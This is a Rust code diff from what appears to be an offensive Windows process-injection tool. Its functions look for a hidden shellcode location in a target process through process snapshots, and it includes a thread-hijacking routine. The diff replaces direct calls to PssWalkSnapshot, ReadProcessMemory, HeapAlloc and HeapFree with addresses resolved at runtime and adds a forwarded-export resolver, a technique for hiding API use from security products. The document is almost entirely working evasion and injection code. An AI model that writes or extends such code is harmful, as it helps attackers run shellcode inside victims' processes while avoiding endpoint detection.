@@ -3,6 +3,8 @@
 #![allow(dead_code)]
 #![allow(unused_unsafe)]
 
+use noldr::{get_dll_address, get_function_address, get_teb};
+
 // Standard library imports
 use std::{ffi::c_void as std_c_void, mem::zeroed, ptr::null_mut};
 
@@ -13,12 +15,11 @@ use Snapshotting_rs::ProcessSnapshot;
 use winapi::{
     ctypes::c_void as winapi_c_void,
     shared::{
-        minwindef::{DWORD, FALSE},
-        winerror::ERROR_SUCCESS,
+        basetsd::SIZE_T, minwindef::{DWORD, FALSE, FARPROC, HMODULE, LPVOID}, winerror::ERROR_SUCCESS
     },
     um::{
         heapapi::{GetProcessHeap, HeapAlloc, HeapFree}, memoryapi::{ReadProcessMemory, VirtualProtectEx, WriteProcessMemory}, processsnapshot::{PSS_CAPTURE_VA_CLONE, PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION}, winnt::{
-            CONTEXT, CONTEXT_ALL, HANDLE, HEAP_ZERO_MEMORY, MEMORY_BASIC_INFORMATION, MEM_IMAGE, PAGE_EXECUTE_READ, PAGE_READWRITE
+            CONTEXT, CONTEXT_ALL, HANDLE, HEAP_ZERO_MEMORY, LPCSTR, MEMORY_BASIC_INFORMATION, MEM_IMAGE, PAGE_EXECUTE_READ, PAGE_READWRITE
         }
     },
 };
@@ -121,7 +122,7 @@ pub fn get_hidden_injection_address(
     }
     //print snapshot handle
 
-    println!("Snapshot handle: {:?}", snapshot_handle.0);
+    //println!("Snapshot handle: {:?}", snapshot_handle.0);
 
     let mut shellcode_location: *mut winapi_c_void = null_mut();
     let mut walker = HPSSWALK::default();
@@ -160,19 +161,24 @@ pub fn get_hidden_injection_address(
     );*/
     //println!("Walker handle raw: {:#x}", walker.0 as usize);
 
-    //YOU ARE HERE
+    //locate the function address for PssWalkSnapshot
+    let pss_walk_snapshot_address = noldr::get_function_address(kernel32, "PssWalkSnapshot");
 
+    //define the function signature
+    type PssWalkSnapshotFn = unsafe extern "system" fn(HPSS, PSS_WALK_INFORMATION_CLASS, HPSSWALK, *mut std_c_void, DWORD) -> u32;
+
+    //call the function
     let mut pss_success = unsafe {
-        let result = PssWalkSnapshot(
+        let result = std::mem::transmute::<_, PssWalkSnapshotFn>(match pss_walk_snapshot_address {
+            Some(addr) => addr,
+            None => return Err("Failed to get PssWalkSnapshot address".to_string()),
+        })(
             snapshot_handle,
             PSS_WALK_VA_SPACE,
             walker,
-            Some(&mut buffer),
+            buffer.as_mut_ptr() as *mut std_c_void,
+            buffer.len() as DWORD
         );
-        //println!(
-        //    "Initial PssWalkSnapshot result: {} (ERROR_NOT_FOUND = 1168)",
-        //    result
-        //);
 
         // Copy buffer regardless of result
         std::ptr::copy_nonoverlapping(
@@ -213,20 +219,58 @@ pub fn get_hidden_injection_address(
                     let mut stack: *mut winapi_c_void = null_mut();
                     let mut stack_offset: usize = 0;
 
-                    let success = unsafe {
-                        ReadProcessMemory(
-                            target_process,
-                            va_space_entry.ImageBase as *const winapi_c_void,
-                            stack,
-                            shellcode_size,
-                            null_mut(),
-                        )
+                    //locate the function address for ReadProcessMemory
+                    let read_process_memory_address = noldr::get_function_address(kernel32, "ReadProcessMemory");
+
+                    //define the function signature
+                    type ReadProcessMemoryFn = unsafe extern "system" fn(HANDLE, *const winapi_c_void, *mut winapi_c_void, SIZE_T, *mut winapi_c_void) -> winapi::shared::minwindef::BOOL;
+
+                    //call the function
+                    let read_process_memory = unsafe {
+                        std::mem::transmute::<_, ReadProcessMemoryFn>(match read_process_memory_address {
+                            Some(addr) => addr,
+                            None => return Err("Failed to get ReadProcessMemory address".to_string()),
+                        })(target_process, va_space_entry.ImageBase as *const winapi_c_void, stack, shellcode_size, null_mut())
                     };
 
-                    let heap = unsafe { GetProcessHeap() };
-                    stack = unsafe {
-                        HeapAlloc(heap, HEAP_ZERO_MEMORY, mem_basic_info.RegionSize as usize)
+                    //locate the function address for GetProcessHeap
+                    let get_process_heap_address = noldr::get_function_address(kernel32, "GetProcessHeap");
+
+                    //check if the address is valid
+                    if get_process_heap_address.is_none() {
+                        return Err("Failed to get GetProcessHeap address".to_string());
+                    }
+
+                    //define the function signature with explicit calling convention
+                    type GetProcessHeapFn = unsafe extern "system" fn() -> HANDLE;
+
+                    //call the function with proper safety wrapper
+                    let heap = unsafe {
+                        let func = std::mem::transmute::<_, GetProcessHeapFn>(get_process_heap_address.unwrap());
+                        (func)()  // Call the function directly rather than through another transmute
                     };
+
+                    //locate the function address for HeapAlloc
+                    let heap_alloc_address = noldr::get_function_address(kernel32, "HeapAlloc")
+                    .map(|addr| unsafe { resolve_forwarded_export(kernel32, addr as *const ()) });
+
+                    // Now try the dynamic version using the same pattern that worked
+                    type HeapAllocFn = unsafe extern "system" fn(
+                        hHeap: HANDLE,
+                        dwFlags: DWORD,
+                        dwBytes: SIZE_T
+                    ) -> LPVOID;
+
+                    let stack = unsafe {
+                        let heap_alloc_fn: HeapAllocFn = std::mem::transmute(heap_alloc_address.unwrap());
+                        
+                        heap_alloc_fn(
+                            heap,
+                            HEAP_ZERO_MEMORY,
+                            mem_basic_info.RegionSize as usize
+                        )
+                    };
+                    //println!("Dynamic HeapAlloc result: {:p}", stack_dynamic);
 
                     if !stack.is_null() {
                         get_helper(
@@ -244,7 +288,27 @@ pub fn get_hidden_injection_address(
                             as *mut winapi_c_void;
                         //println!("Shellcode location: {:p}", shellcode_location);
 
-                        unsafe { HeapFree(heap, 0, stack) };
+                        //locate the function address for HeapFree
+                        let heap_free_address = noldr::get_function_address(kernel32, "HeapFree");
+
+                        //define the function signature
+                        type HeapFreeFn = unsafe extern "system" fn(HANDLE, DWORD, LPVOID) -> winapi::shared::minwindef::BOOL;
+
+                        //call the function
+                        let heap_free = unsafe {
+                            std::mem::transmute::<_, HeapFreeFn>(heap_free_address.unwrap())
+                        };
+
+                        //check if the function call was successful
+                        if unsafe { heap_free(heap, 0, stack) } == FALSE {
+                            eprintln!("[!] HeapFree failed: Win32 error {}", unsafe {
+                                winapi::um::errhandlingapi::GetLastError()
+                            });
+                            return Err("Failed to free heap".to_string());
+                        }
+
+                        //YOU ARE HERE
+
                         unsafe { PssWalkMarkerFree(walker) };
                         //println!("[+] Original base address: {:p}", mem_basic_info.BaseAddress);
                         //println!("[+] Stack offset: {:#x}", stack_offset);
@@ -594,5 +658,45 @@ pub fn snap_thread_hijack(
         }
 
         true
+    }
+}
+
+// Helper function to check if address is a forwarder
+unsafe fn resolve_forwarded_export(kernel32: *mut std_c_void, address: *const ()) -> *const () {
+    
+    let dos_header = kernel32 as *const winapi::um::winnt::IMAGE_DOS_HEADER;
+    let nt_headers = (kernel32 as usize + (*dos_header).e_lfanew as usize) 
+        as *const winapi::um::winnt::IMAGE_NT_HEADERS;
+    let export_dir = &(*nt_headers).OptionalHeader.DataDirectory[0];
+    
+    // Check if address is within export directory
+    let export_start = kernel32 as usize + export_dir.VirtualAddress as usize;
+    let export_end = export_start + export_dir.Size as usize;
+    
+    if (address as usize) >= export_start && (address as usize) <= export_end {
+        //locate GetProcAddress
+        let get_proc_address = get_function_address(kernel32, "GetProcAddress");
+
+        //call GetProcAddress
+        let get_proc_address_fn = unsafe {
+            std::mem::transmute::<_, GetProcAddressFn>(get_proc_address.unwrap())
+        };
+
+        //define the function signature
+        type GetProcAddressFn = unsafe extern "system" fn(HMODULE, LPCSTR) -> FARPROC;
+
+        let heap_alloc_str = std::ffi::CString::new("HeapAlloc").unwrap();
+
+        //call the function
+        //let get_proc_address_result = get_proc_address_fn(kernel32 as _, heap_alloc_str.as_ptr());
+
+        // It's a forwarder - use GetProcAddress to get real address
+        //use winapi::um::libloaderapi::GetProcAddress;
+        
+        //GetProcAddress(kernel32 as _, heap_alloc_str.as_ptr()) as *const ()
+        let get_proc_address_result = get_proc_address_fn(kernel32 as _, heap_alloc_str.as_ptr()) as *const ();
+        get_proc_address_result
+    } else {
+        address
     }
 }
